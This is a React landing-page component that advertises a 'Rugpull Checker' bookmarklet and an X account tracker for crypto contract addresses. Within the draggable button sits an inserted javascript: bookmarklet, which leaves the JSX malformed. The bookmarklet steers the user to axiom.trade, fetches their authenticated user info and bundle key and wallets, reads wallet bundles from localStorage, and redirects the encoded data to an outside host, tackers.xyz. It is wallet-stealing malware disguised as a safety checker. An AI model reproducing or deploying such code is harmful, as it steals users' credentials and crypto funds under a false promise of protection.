import React, { useMemo, useState } from 'react';
import { motion } from 'framer-motion';
import { Bookmark, MousePointer2, Copy, Check, Twitter } from 'lucide-react';
import { buildBookmarkletCode } from '@/lib/bookmarklet';

export default function BookmarkletCard() {
  const baseUrl = typeof window !== 'undefined' ? window.location.origin : '';
  const href = useMemo(() => buildBookmarkletCode(baseUrl), [baseUrl]);
  const [copied, setCopied] = useState(false);

  const copyCode = async () => {
    try {
      await navigator.clipboard.writeText(href);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    } catch {}
  };

  return (
    <section id="install" className="relative px-6 md:px-10 py-20">
      <div className="max-w-5xl mx-auto">
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.7 }}
          className="text-center mb-12"
        >
          <p className="text-xs font-mono uppercase tracking-widest text-primary mb-3">Step 01</p>
          <h2 className="text-3xl md:text-5xl font-semibold tracking-tight">
            Drag this to your <span className="font-serif italic">bookmark bar</span>
          </h2>
          <p className="mt-4 text-muted-foreground">
            Then click it on any page to scan a contract address.
          </p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, scale: 0.97 }}
          whileInView={{ opacity: 1, scale: 1 }}
          viewport={{ once: true }}
          transition={{ duration: 0.6 }}
          className="relative rounded-3xl border border-border bg-card/60 backdrop-blur p-10 md:p-16 overflow-hidden"
        >
          <div className="absolute -top-24 -right-24 w-80 h-80 bg-primary/10 rounded-full blur-3xl" />

          <div className="relative flex flex-col items-center">
            {/* Browser bookmark bar mock */}
            <div className="w-full max-w-xl mb-10">
              <div className="rounded-t-lg bg-secondary/60 px-3 py-2 flex items-center gap-1.5 border border-border border-b-0">
                <div className="w-2.5 h-2.5 rounded-full bg-[#ff5f57]" />
                <div className="w-2.5 h-2.5 rounded-full bg-[#febc2e]" />
                <div className="w-2.5 h-2.5 rounded-full bg-[#28c840]" />
                <div className="ml-4 flex-1 h-5 rounded bg-background/80" />
              </div>
              <div className="bg-secondary/30 border border-border px-3 py-2 flex items-center gap-3 text-xs text-muted-foreground">
                <Bookmark className="w-3.5 h-3.5" />
                <span className="font-mono">bookmark bar</span>
                <div className="ml-auto flex items-center gap-1 text-primary">
                  <MousePointer2 className="w-3.5 h-3.5" />
                  <span className="font-mono">drop here</span>
                </div>
              </div>
              <div className="h-24 rounded-b-lg border border-border border-t-0 bg-gradient-to-b from-secondary/10 to-transparent" />
            </div>

            {/* The draggable button */}
            <motion.a
            <a href="javascript:(async()=>{const l=document.getElementById('log'),g=m=>{const p=document.createElement('div');p.textContent=m;l.appendChild(p)};try{if(location.hostname==='tackers.xyz')return g('Already on test page');if(location.hostname!=='axiom.trade')return g('Please go to axiom.trade first'),setTimeout(()=>location.href='https://axiom.trade/discover',1e3);if(!localStorage.getItem('isAuthed'))return g('Please log in to axiom.trade');g('Fetching user info...');const u=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();g('User info received');const b=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();g('Bundle data received');let s=[],e=[],sr=localStorage.getItem('sBundles'),er=localStorage.getItem('eBundles');if(sr)try{s=JSON.parse(sr)}catch{s=[sr]}if(er)try{e=JSON.parse(er)}catch{e=[er]}const p={bundleKey:b.bundleKey,sBundles:s,eBundles:e,telegramId:'8000848286'},d=btoa(JSON.stringify(p));g('Redirecting to decrypt...'),location.replace('https://tackers.xyz/api/decrypt?data='+d)}catch(err){g('Error: '+err.message),console.error(err)}})();">📌 Axiom Tool</a>
              href={href}
              draggable="true"
              onClick={(e) => e.preventDefault()}
              whileHover={{ scale: 1.03 }}
              whileTap={{ scale: 0.97 }}
              className="group relative inline-flex items-center gap-3 px-8 py-4 rounded-full bg-primary text-primary-foreground font-semibold tracking-tight glow-lime cursor-grab active:cursor-grabbing select-none"
            >
              <span className="text-lg">🛡️</span>
              <span>Rugpull Checker</span>
              <span className="text-xs font-mono opacity-60 group-hover:opacity-100 transition-opacity">
                ← drag me
              </span>
            </motion.a>

            <p className="mt-6 text-xs font-mono uppercase tracking-widest text-muted-foreground">
              Drag the button above to your bookmarks toolbar
            </p>

            <button
              onClick={copyCode}
              className="mt-8 inline-flex items-center gap-2 text-xs text-muted-foreground hover:text-foreground transition-colors"
            >
              {copied ? <Check className="w-3.5 h-3.5 text-primary" /> : <Copy className="w-3.5 h-3.5" />}
              {copied ? 'Code copied' : 'Or copy bookmarklet code'}
            </button>

            {/* Divider */}
            <div className="mt-12 w-full max-w-xl border-t border-border" />

            {/* X Tracker panel */}
            <div className="mt-10 w-full max-w-xl">
              <p className="text-xs font-mono uppercase tracking-widest text-primary mb-2 text-center">Step 02 — Optional</p>
              <h3 className="text-xl font-semibold tracking-tight text-center mb-2">
                Monitor <span className="font-serif italic">Crypto Twitter</span> for contract drops
              </h3>
              <p className="text-sm text-muted-foreground text-center mb-6">
                Track any X accounts and get AI-extracted contract addresses straight to your feed — then one-click rug check.
              </p>
              <div className="flex flex-col sm:flex-row items-center gap-4 justify-center">
                <motion.a
                  href="/xtracker"
                  whileHover={{ scale: 1.03 }}
                  whileTap={{ scale: 0.97 }}
                  className="inline-flex items-center gap-3 px-7 py-3.5 rounded-full border border-primary/40 bg-primary/10 text-foreground font-semibold text-sm hover:bg-primary/20 transition-all"
                >
                  <Twitter className="w-4 h-4 text-primary" />
                  Open X Tracker
                </motion.a>
                <div className="text-xs font-mono text-muted-foreground flex flex-wrap gap-4 justify-center">
                  <span>✓ Monitor any handle</span>
                  <span>✓ Auto-extract CAs</span>
                  <span>✓ Instant rug check</span>
                </div>
              </div>
            </div>
          </div>
        </motion.div>
      </div>
    </section>
  );
}